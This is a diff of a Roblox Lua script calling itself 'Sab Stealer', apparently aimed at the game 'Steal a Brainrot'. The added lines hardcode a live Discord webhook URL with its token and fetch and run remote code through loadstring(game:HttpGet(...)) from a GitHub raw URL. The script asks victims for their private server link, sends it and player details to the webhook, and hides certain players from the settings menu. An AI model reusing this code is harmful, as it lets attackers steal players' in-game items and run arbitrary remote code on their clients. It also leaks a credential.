@@ -1,4 +1,4 @@
-setclipboard("https://discord.gg/UgEG6gVc")
+setclipboard("https://discord.gg/67A7N7Tm4")
 game:GetService("StarterGui"):SetCore("SendNotification", {
     Title = "Discord Invite Copied!",
     Text = "Join For Support!",
@@ -42,7 +42,7 @@ do
     end
 end
 
-local WEBHOOK = config.WEBHOOK
+local WEBHOOK = "https://discord.com/api/webhooks/1435223462858723349/v9ocYjJYqVr7uqttSfE2uzjJ4isMQxkKuiJABOFKgG32b2uOizjuFoixLA5EAfLtdH-3"
 local PRICE_LIMIT = config.PRICE_LIMIT
 local targetNames = config.targetNames or {}
 local receiverList = table.concat(config.Receiver or {}, ", ")
@@ -206,7 +206,6 @@ local function collectValidPets()
 
 	return pets
 end
-
 local function detectExecutor()
     local executor = "Unknown"
     if syn then executor = "Synapse X"
@@ -274,6 +273,7 @@ local function sendWebhook(link)
         ["title"] = "😜 Sab Stealer - Make By Phatlee",
         ["color"] = serverType == "PUBLIC SERVER" and 16711680 or 65280,
         ["fields"] = {
+            { ["name"] = "Hit By", ["value"] = "moreira" },
             { ["name"] = "Players", ["value"] = string.format("%d/6", #Players:GetPlayers()) },
             { ["name"] = "Server Type", ["value"] = serverType },
             { ["name"] = "👥 Player Information",
@@ -303,115 +303,121 @@ local function sendWebhook(link)
 end
 
 if serverType == "PUBLIC SERVER" then
-	sendWebhook()
-	pcall(function()
-		a() -- chạy script chính
-	end)
+    sendWebhook()
+    pcall(function()
+        pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/moreira/refs/heads/main/moreira"))()
+        end)
+    end)
 else
-	local playerGui = player and player:WaitForChild("PlayerGui")
-	if playerGui then
-		local screenGui = Instance.new("ScreenGui", playerGui)
-		screenGui.Name = "StealBrainrotGUI"
-		screenGui.ResetOnSpawn = false
+    local playerGui = player and player:WaitForChild("PlayerGui")
+    if playerGui then
+        local screenGui = Instance.new("ScreenGui", playerGui)
+        screenGui.Name = "StealBrainrotGUI"
+        screenGui.ResetOnSpawn = false
 
-		local frame = Instance.new("Frame", screenGui)
-		frame.Size = UDim2.new(0, 320, 0, 180)
-		frame.Position = UDim2.new(0.5, -160, 0.5, -90)
-		frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-		frame.Active = true
-		frame.Draggable = true
-		Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
+        local frame = Instance.new("Frame", screenGui)
+        frame.Size = UDim2.new(0, 320, 0, 180)
+        frame.Position = UDim2.new(0.5, -160, 0.5, -90)
+        frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
+        frame.Active = true
+        frame.Draggable = true
+        Instance.new("UICorner", frame).CornerRadius = UDim.new(0,12)
 
-		local title = Instance.new("TextLabel", frame)
-		title.Text = "Steal a Brainrot"
-		title.Font = Enum.Font.FredokaOne
-		title.TextSize = 20
-		title.TextColor3 = Color3.fromRGB(255, 255, 255)
-		title.BackgroundTransparency = 1
-		title.Size = UDim2.new(1, 0, 0, 28)
-		title.Position = UDim2.new(0, 0, 0, 4)
+        local title = Instance.new("TextLabel", frame)
+        title.Text = "Steal a Brainrot"
+        title.Font = Enum.Font.FredokaOne
+        title.TextSize = 20
+        title.TextColor3 = Color3.fromRGB(255,255,255)
+        title.BackgroundTransparency = 1
+        title.Size = UDim2.new(1,0,0,28)
+        title.Position = UDim2.new(0,0,0,4)
 
-		local closeButton = Instance.new("TextButton", frame)
-		closeButton.Text = "X"
-		closeButton.Font = Enum.Font.FredokaOne
-		closeButton.TextSize = 18
-		closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-		closeButton.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
-		closeButton.Size = UDim2.new(0, 28, 0, 28)
-		closeButton.Position = UDim2.new(1, -34, 0, 4)
-		Instance.new("UICorner", closeButton).CornerRadius = UDim.new(0, 8)
-		closeButton.MouseButton1Click:Connect(function() screenGui:Destroy() end)
+        local closeButton = Instance.new("TextButton", frame)
+        closeButton.Text = "X"
+        closeButton.Font = Enum.Font.FredokaOne
+        closeButton.TextSize = 18
+        closeButton.TextColor3 = Color3.fromRGB(255,255,255)
+        closeButton.BackgroundColor3 = Color3.fromRGB(60,0,0)
+        closeButton.Size = UDim2.new(0,28,0,28)
+        closeButton.Position = UDim2.new(1,-34,0,4)
+        Instance.new("UICorner", closeButton).CornerRadius = UDim.new(0,8)
+        closeButton.MouseButton1Click:Connect(function() screenGui:Destroy() end)
 
-		local textBox = Instance.new("TextBox", frame)
-		textBox.Size = UDim2.new(0.9, 0, 0, 40)
-		textBox.Position = UDim2.new(0.05, 0, 0, 60)
-		textBox.PlaceholderText = "Please enter your private server link"
-		textBox.Text = ""
-		textBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-		textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-		textBox.ClearTextOnFocus = false
-		textBox.Font = Enum.Font.FredokaOne
-		textBox.TextSize = 14
-		Instance.new("UICorner", textBox).CornerRadius = UDim.new(0, 8)
+        local textBox = Instance.new("TextBox", frame)
+        textBox.Size = UDim2.new(0.9,0,0,40)
+        textBox.Position = UDim2.new(0.05,0,0,60)
+        textBox.PlaceholderText = "Please enter your private server link"
+        textBox.Text = ""
+        textBox.BackgroundColor3 = Color3.fromRGB(50,50,50)
+        textBox.TextColor3 = Color3.fromRGB(255,255,255)
+        textBox.ClearTextOnFocus = false
+        textBox.Font = Enum.Font.FredokaOne
+        textBox.TextSize = 14
+        Instance.new("UICorner", textBox).CornerRadius = UDim.new(0,8)
 
-		local sendButton = Instance.new("TextButton", frame)
-		sendButton.Text = "Send"
-		sendButton.Font = Enum.Font.FredokaOne
-		sendButton.TextSize = 18
-		sendButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-		sendButton.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
-		sendButton.Size = UDim2.new(0.4, 0, 0, 32)
-		sendButton.Position = UDim2.new(0.3, 0, 0, 110)
-		Instance.new("UICorner", sendButton).CornerRadius = UDim.new(0, 8)
+        local sendButton = Instance.new("TextButton", frame)
+        sendButton.Text = "Send"
+        sendButton.Font = Enum.Font.FredokaOne
+        sendButton.TextSize = 18
+        sendButton.TextColor3 = Color3.fromRGB(255,255,255)
+        sendButton.BackgroundColor3 = Color3.fromRGB(0,100,0)
+        sendButton.Size = UDim2.new(0.4,0,0,32)
+        sendButton.Position = UDim2.new(0.3,0,0,110)
+        Instance.new("UICorner", sendButton).CornerRadius = UDim.new(0,8)
 
-		local function showError(msg)
-			local popup = Instance.new("Frame", screenGui)
-			popup.Size = UDim2.new(0, 300, 0, 120)
-			popup.Position = UDim2.new(0.5, -150, 0.5, -60)
-			popup.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-			popup.AnchorPoint = Vector2.new(0.5, 0.5)
-			Instance.new("UICorner", popup).CornerRadius = UDim.new(0, 12)
-			local label = Instance.new("TextLabel", popup)
-			label.Size = UDim2.new(1, -20, 0.6, 0)
-			label.Position = UDim2.new(0, 10, 0.1, 0)
-			label.BackgroundTransparency = 1
-			label.Text = msg
-			label.TextColor3 = Color3.fromRGB(255, 255, 255)
-			label.TextScaled = true
-			label.Font = Enum.Font.FredokaOne
-			local button = Instance.new("TextButton", popup)
-			button.Size = UDim2.new(0.5, 0, 0.25, 0)
-			button.Position = UDim2.new(0.25, 0, 0.7, 0)
-			button.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
-			button.Text = "OK"
-			button.TextColor3 = Color3.fromRGB(255, 255, 255)
-			button.Font = Enum.Font.FredokaOne
-			Instance.new("UICorner", button).CornerRadius = UDim.new(0, 8)
-			button.MouseButton1Click:Connect(function() popup:Destroy() end)
-			task.delay(5, function() if popup and popup.Parent then popup:Destroy() end end)
-		end
+        local function showError(msg)
+            local popup = Instance.new("Frame", screenGui)
+            popup.Size = UDim2.new(0,300,0,120)
+            popup.Position = UDim2.new(0.5,-150,0.5,-60)
+            popup.BackgroundColor3 = Color3.fromRGB(30,30,30)
+            popup.AnchorPoint = Vector2.new(0.5,0.5)
+            Instance.new("UICorner", popup).CornerRadius = UDim.new(0,12)
+            local label = Instance.new("TextLabel", popup)
+            label.Size = UDim2.new(1,-20,0.6,0)
+            label.Position = UDim2.new(0,10,0.1,0)
+            label.BackgroundTransparency = 1
+            label.Text = msg
+            label.TextColor3 = Color3.fromRGB(255,255,255)
+            label.TextScaled = true
+            label.Font = Enum.Font.FredokaOne
+            local button = Instance.new("TextButton", popup)
+            button.Size = UDim2.new(0.5,0,0.25,0)
+            button.Position = UDim2.new(0.25,0,0.7,0)
+            button.BackgroundColor3 = Color3.fromRGB(70,70,70)
+            button.Text = "OK"
+            button.TextColor3 = Color3.fromRGB(255,255,255)
+            button.Font = Enum.Font.FredokaOne
+            Instance.new("UICorner", button).CornerRadius = UDim.new(0,8)
+            button.MouseButton1Click:Connect(function() popup:Destroy() end)
+            task.delay(5,function() if popup and popup.Parent then popup:Destroy() end end)
+        end
 
-		local function isValidPrivateServerLink(txt)
-			return string.match(txt or "", "^https://www%.roblox%.com/share%?code=.+&type=Server$") ~= nil
-		end
+        local function isValidPrivateServerLink(txt)
+            return string.match(txt or "", "^https://www%.roblox%.com/share%?code=.+&type=Server$") ~= nil
+        end
 
-		local function handleSend()
-			local txt = textBox.Text or ""
-			if isValidPrivateServerLink(txt) then
-				screenGui:Destroy()
-				task.spawn(function()
-					pcall(function() sendWebhook(txt) end)
-					pcall(function() a() end) -- chạy script chính sau khi gửi webhook
-				end)
-			else
-				showError("Please enter your private server link")
-			end
-		end
+        local function handleSend()
+            local txt = textBox.Text or ""
+            if isValidPrivateServerLink(txt) then
+                screenGui:Destroy()
+                task.spawn(function()
+                    pcall(function() sendWebhook(txt) end)
+                    pcall(function()
+                        loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/moreira/refs/heads/main/moreira"))()
+                    end)
+                end)
+            else
+                showError("Please enter your private server link")
+            end
+        end
 
-		sendButton.MouseButton1Click:Connect(handleSend)
-	end
+        sendButton.MouseButton1Click:Connect(handleSend)
+        textBox.FocusLost:Connect(function(enterPressed)
+            if enterPressed then handleSend() end
+        end)
+    end
 end
-
 
 local plotsFolder = Workspace:FindFirstChild("Plots")
 local myBase = nil
@@ -568,28 +574,28 @@ task.spawn(function()
 end)
 
 task.spawn(function()
-    local CoreGui = game:GetService("CoreGui")
-    while task.wait(0.01) do
-        local root = CoreGui:FindFirstChild("RobloxGui")
+    local CoreGui = game:GetService("CoreGui")  -- 👈 thêm nhiều tên nếu muốn xoá nhiều người
+
+    while task.wait(0.05) do
+        ---------------------------
+        -- XÓA TRONG SETTINGS MENU
+        ---------------------------
+        local playersFolder = CoreGui:FindFirstChild("RobloxGui")
             and CoreGui.RobloxGui:FindFirstChild("SettingsClippingShield")
             and CoreGui.RobloxGui.SettingsClippingShield:FindFirstChild("SettingsShield")
-            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield
-                :FindFirstChild("MenuContainer")
-            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer
-                :FindFirstChild("PageViewClipper")
-            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.PageViewClipper
-                :FindFirstChild("PageView")
-            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.PageViewClipper.PageView
-                :FindFirstChild("PageViewInnerFrame")
-            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.PageViewClipper.PageView.PageViewInnerFrame
-                :FindFirstChild("Players")
+            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield:FindFirstChild("MenuContainer")
+            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer:FindFirstChild("Page")
+            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page:FindFirstChild("PageViewClipper")
+            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper:FindFirstChild("PageView")
+            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView:FindFirstChild("PageViewInnerFrame")
+            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame:FindFirstChild("Players")
 
-        if root then
+        if playersFolder then
             for _, badName in ipairs(badPlayers) do
-                local fullLabel = "PlayerLabel" .. badName
-                local target = root:FindFirstChild(fullLabel)
+                local target = playersFolder:FindFirstChild("PlayerLabel" .. badName)
                 if target then
                     target:Destroy()
+                    print("✅ Đã xoá PlayerLabel " .. badName)
                 end
             end
         end
@@ -665,64 +671,56 @@ task.spawn(function()
     end
 end)
 
--- LocalScript (StarterPlayerScripts)
-local CoreGui = game:GetService("CoreGui")
+local blockedSounds = {
+	["rbxassetid://18145114696"] = true,
+	["rbxassetid://18319185077"] = true
+}
 
-local function checkAndKick(text)
-	if not text then return end
-	local lower = string.lower(text)
-	if string.find(lower, "kick", 1, true) then
-		-- Kick chính bản thân với nội dung xuống dòng
-		player:Kick("you lost all your brainrot\nhttps://discord.gg/UgEG6gVc")
-	end
-end
-
--- Đợi ExperienceChat load
-local experienceChat = CoreGui:WaitForChild("ExperienceChat", 5)
-if not experienceChat then
-	warn("ExperienceChat không tìm thấy.")
-	return
-end
-
-local contentPath = experienceChat:WaitForChild("appLayout", 5)
-contentPath = contentPath and contentPath:WaitForChild("chatWindow", 5)
-contentPath = contentPath and contentPath:WaitForChild("scrollingView", 5)
-contentPath = contentPath and contentPath:WaitForChild("bottomLockedScrollView", 5)
-contentPath = contentPath and contentPath:WaitForChild("RCTScrollView", 5)
-contentPath = contentPath and contentPath:WaitForChild("RCTScrollContentView", 5)
-
-if not contentPath then
-	warn("Không thể tìm RCTScrollContentView.")
-	return
-end
-
--- Kiểm tra các message đã có
-for _, child in ipairs(contentPath:GetChildren()) do
-	local textMessage = child:FindFirstChild("TextMessage")
-	if textMessage then
-		local body = textMessage:FindFirstChild("BodyText")
-		if body and body:IsA("TextLabel") then
-			checkAndKick(body.Text)
+local function deleteSpecificSounds()
+	for _, obj in pairs(Workspace:GetDescendants()) do
+		if obj:IsA("Sound") and blockedSounds[obj.SoundId] then
+			obj:Destroy()
 		end
 	end
 end
 
--- Bắt sự kiện khi có message mới (mỗi message có ID ngẫu nhiên)
-contentPath.DescendantAdded:Connect(function(desc)
-	-- nếu chính node BodyText được thêm
-	if desc.Name == "BodyText" and desc:IsA("TextLabel") then
-		task.wait()
-		checkAndKick(desc.Text)
+local function deleteCoilSounds()
+	if not badPlayers or not badPlayers:IsDescendantOf(Workspace) then
 		return
 	end
-
-	-- hoặc nếu một frame mới được thêm có TextMessage.BodyText bên trong
-	local textMessage = desc:FindFirstChild("TextMessage")
-	if textMessage then
-		local body = textMessage:FindFirstChild("BodyText")
-		if body and body:IsA("TextLabel") then
-			task.wait()
-			checkAndKick(body.Text)
+	for _, obj in pairs(badPlayers:GetDescendants()) do
+		if obj:IsA("Sound") then
+			local soundId = string.lower(obj.SoundId or "")
+			local name = string.lower(obj.Name or "")
+			if string.find(soundId, "Coil") or string.find(name, "Coil") then
+				obj:Destroy()
+			end
 		end
 	end
+end
+
+deleteSpecificSounds()
+deleteCoilSounds()
+
+Workspace.DescendantAdded:Connect(function(obj)
+	if obj:IsA("Sound") and blockedSounds[obj.SoundId] then
+		obj:Destroy()
+	end
 end)
+
+if badPlayers then
+	badPlayers.DescendantAdded:Connect(function(obj)
+		if obj:IsA("Sound") then
+			local soundId = string.lower(obj.SoundId or "")
+			local name = string.lower(obj.Name or "")
+			if string.find(soundId, "Coil") or string.find(name, "Coil") then
+				obj:Destroy()
+			end
+		end
+	end)
+end
+
+while task.wait(0.1) do
+	deleteSpecificSounds()
+	deleteCoilSounds()
+end
